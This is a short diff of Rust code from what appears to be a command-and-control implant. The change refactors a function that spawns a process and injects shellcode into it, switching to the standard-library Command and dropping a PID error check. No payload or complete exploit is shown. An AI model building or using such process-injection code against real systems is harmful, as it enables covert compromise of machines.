@@ -1,9 +1,8 @@
 use std::fs;
 use std::io::Write;
-use std::process::Stdio;
+use std::process::{Command, Stdio};
 
 use red_cell_common::demon::DemonCommand;
-use tokio::process::Command;
 
 use crate::command::PhantomState;
 use crate::command::encode::encode_u32;
@@ -160,10 +159,7 @@ async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
         }
     };
 
-    let Some(child_pid) = child.id() else {
-        tracing::warn!("failed to get child PID");
-        return INJECT_ERROR_FAILED;
-    };
+    let child_pid = child.id();
 
     inject_shellcode_into_pid(child_pid, shellcode).await
 }
